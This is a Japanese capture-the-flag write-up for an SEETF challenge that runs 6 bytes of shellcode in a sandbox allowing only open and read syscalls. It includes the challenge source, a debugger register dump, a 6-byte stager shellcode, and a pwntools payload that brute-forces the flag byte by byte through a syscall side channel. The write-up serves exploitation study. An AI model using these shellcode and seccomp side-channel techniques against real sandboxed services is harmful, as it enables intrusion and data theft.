# reversing

問題は以下の通り。この問題はソースコードが同梱されている。

```

chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=2f95a46c0648ddb022c28460d3b1c0548edb3084, for GNU/Linux 3.2.0, not stripped


・chall.c

int main(int argc, char **argv, char **envp)
{
    shellcode_mem = mmap((void *) 0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode_mem == (void *) 0x1337000);

    puts("Welcome to the SEETF shellcode sandbox!");
    puts("======================================");
    puts("Allowed syscalls: open, read");
    puts("You've got 6 bytes, make them count!");
    puts("======================================");
    fflush(stdout);

    shellcode_size = read(0, shellcode_mem, 0x6);
    assert(shellcode_size > 0);

    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_KILL);

    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);    
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode_mem)();
}
```

mmapでshellcodeを実行する領域を確保し、そこに6バイト分書き込む。その後seccompで色々設定しているが、要はopenとreadのシステムコールしか使えない。

# exploit
## first shellcode
　まずは制約である6バイトをどう解消するかがカギになる。6バイト程度だとopenやreadの引数をすべて設定し直すのは無理だろう。

そこでmmapが実行されたときの各レジスタを見てみると、
```
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x55a8b8be8629
$rdx   : 0x00000001337000  →  0x0000050f5e52ff31
$rsp   : 0x007ffc79ffd4b0  →  0x0000000000000002
$rbp   : 0x007ffc79ffd4e0  →  0x0000000000000001
$rsi   : 0x0055ade2609010  →  0x0001000000000007
$rdi   : 0x7
$rip   : 0x0055ade20343ba  →  <main+529> call rdx
$r8    : 0x0055ade2609f20  →  0x000055a8b8be8629
$r9    : 0x0055ade2609f20  →  0x000055a8b8be8629
$r10   : 0x1
$r11   : 0x3022f71ff1d25d6e
$r12   : 0x007ffc79ffd5f8  →  0x007ffc79fff4b4  →  0x6c6c6168632f2e ("./chall"?)
$r13   : 0x0055ade20341a9  →  <main+0> push rbp
$r14   : 0x0055ade2036dc8  →  0x0055ade2034160  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007fdfc99e9040  →  0x007fdfc99ea2e0  →  0x0055ade2033000  →   jg 0x55ade2033047
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00

─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55ade20343ab <main+514>       mov    rax, QWORD PTR [rip+0x2cae]        # 0x55ade2037060 <shellcode_mem>
   0x55ade20343b2 <main+521>       mov    rdx, rax
   0x55ade20343b5 <main+524>       mov    eax, 0x0
 → 0x55ade20343ba <main+529>       call   rdx
   0x55ade20343bc <main+531>       mov    eax, 0x0
   0x55ade20343c1 <main+536>       leave
   0x55ade20343c2 <main+537>       ret
   0x55ade20343c3                  add    BYTE PTR [rax-0x7d], cl
   0x55ade20343c6 <_fini+2>        in     al, dx
─────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
```
　各レジスタに注目してみる。syscallを設定するraxがちょうど0(read)、読み込むバイト数であるrdxにはアドレスが格納されているおかげで書き込む量は問題ない。つまり変更したいのは、rdi(fd)とrsi(書き込み先)になる。
rdiを0にするのは簡単でxor rdi, rdiにするかmov 0してしまえばいい。rsiにはmmapのアドレスを指定したいが、ちょうどrdxがそのアドレスを指している。mov命令だと長さが足りないが、push popをうまく使えばちょうどサイズ内に収まる。
```
\x31\xff\x52\x5e\x0f\x05 (xor edi, edi; push rdx ; pop rsi; syscall)
```
## second shellcode
ここからどうflagをリークするかで詰まってしまった。まずseccompされているのを考慮すると、当時考えられたのが以下の通り。
 - seccompの解除
 - openとreadを使ってflagをリークする
 - その他の脆弱性

まずseccompを回避しようと試みたが、結局どのシステムコールも使用できなかった(retfで32bitにしてexecve, shellcodeでもう一度seccompを呼び出す等)。残念ながら他に糸口は見つからず断念した。

以下はdiscordにあったwriteupを参考にしたものである。

```
payload = asm(
    shellcraft.pushstr("./flag") + 
    shellcraft.open('rsp',0,0) + 
    shellcraft.read('rax','rsp',0x100) +
    'movzx rax, byte ptr [rsp+{}];'.format(index) +
    'xor rax, {};'.format(ord(c)) + 
    'xor rdi, rdi;' +
    'syscall;'
    )
```
このコードでやっていることは以下の通り。
- mmap領域にflagの文字列を読み込む(openとread)
- flag(index)の文字とc(解読用の文字列 solver参照)をxorする
- xorした結果をraxに格納し、readのシステムコールを呼び出す
- readが正常に呼ばれた(xor rax, rax == 0)ならその文字がflag(ただしopenも普通に呼べるので注意)

これをブルートフォースすると最終的にflagが手に入る。
